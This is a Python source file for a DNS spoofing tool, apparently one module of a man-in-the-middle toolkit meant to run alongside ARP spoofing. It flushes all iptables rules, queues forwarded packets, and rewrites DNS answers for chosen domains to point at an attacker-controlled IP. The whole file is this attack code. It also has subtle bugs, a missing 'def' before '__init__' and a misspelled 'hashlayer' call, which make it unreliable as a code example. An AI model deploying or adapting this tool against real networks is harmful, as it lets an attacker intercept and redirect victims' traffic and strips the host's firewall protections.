import sys
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os


class DNS_Spoofer:
    __init__(self):
        self.options = {"listening_ip": "INSERT_PRIVATE_IP"}
        self.domains = ["www.example.com"]
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.hashlayer(DNSRR):
            try:
                scapy_packet = self.modify_packet(scapy_packet)
            except IndexError:
                pass
            sys.stdout = open(os.devnull, 'w')
            send(scapy_packet)
        packet.accept()
    def modify_packet(self, packet):
        qname = packet[DNSQR].qname
        if not qname in self.domains:
            return packet
        packet[DNS].an = DNSRR(rrname=qname, rdata=self.options["listening_ip"])
        packet[DNS].ancount = 1
        sys.stdout = sys.__stdout__
        print("[+] Editing DNS from {} to {} [+]".format(packet[IP].src, self.options["listening_ip"]))
        del packet[IP].len
        del packet[IP].chksum
        del packet[UDP].len
        del packet[UDP].chksum
        return packet
    def start_dns(self):
        os.system("iptables --flush")
        QUEUE_NUM = 0
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        queue = NetfilterQueue()
        try:
            queue.bind(QUEUE_NUM, self.process_packet)
            queue.run()
        except KeyboardInterrupt:
            sys.stdout = sys.__stdout__
            print("Exiting...")
            os.system("iptables --flush")
    def printOptions(self):
        print("!-!-! DNS_Spoof !-!-!")
        print("IMPORTANT: Be sure to run this at the same time of the arp spoofing module")
        print("---Options---")
        print("listening_ip: {}".format(self.options["listening_ip"]))
        print("---Domains---")
        for i in self.domains:
            print(i)
        print("---Commands---")
        print("add [DOMAIN-NAME]) Add a domain to spoof")
        print("remove [DOMAIN-NAME]) Remove a domain to spoof")
        print("r) Run this module")
        print("set [option] [value]) Set a parameter for this module")
        print("b) Exit this module")
